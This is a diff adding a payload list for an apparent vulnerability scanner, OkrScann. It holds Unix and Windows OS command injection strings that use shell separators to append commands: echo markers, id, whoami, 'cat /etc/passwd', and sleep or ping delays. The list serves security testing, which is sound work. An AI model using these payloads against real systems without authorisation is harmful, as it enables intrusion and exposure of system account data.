@@ -1,0 +1,40 @@
+# OS Command Injection Payloads -- OkrScann reference list
+# Usage: python main.py -u "..." --scan-type cmdi --payloads payloads/cmdi.txt
+#
+# Format: one payload per line.  Lines starting with # are ignored.
+# -----------------------------------------------------------------------
+
+# -- Output-based (Unix) --
+; echo okrscann7x3q
+| echo okrscann7x3q
+|| echo okrscann7x3q
+& echo okrscann7x3q
+&& echo okrscann7x3q
+`echo okrscann7x3q`
+$(echo okrscann7x3q)
+; cat /etc/passwd
+| cat /etc/passwd
+; id
+| id
+; whoami
+| whoami
+
+# -- Output-based (Windows) --
+& echo okrscann7x3q
+| echo okrscann7x3q
+&& echo okrscann7x3q
+
+# -- Time-based (Unix) --
+; sleep 5
+| sleep 5
+|| sleep 5
+& sleep 5 &
+&& sleep 5
+`sleep 5`
+$(sleep 5)
+| ping -c 5 127.0.0.1
+
+# -- Time-based (Windows) --
+& timeout /T 5 /NOBREAK >nul
+| timeout /T 5 /NOBREAK >nul
+& ping -n 5 127.0.0.1 >nul
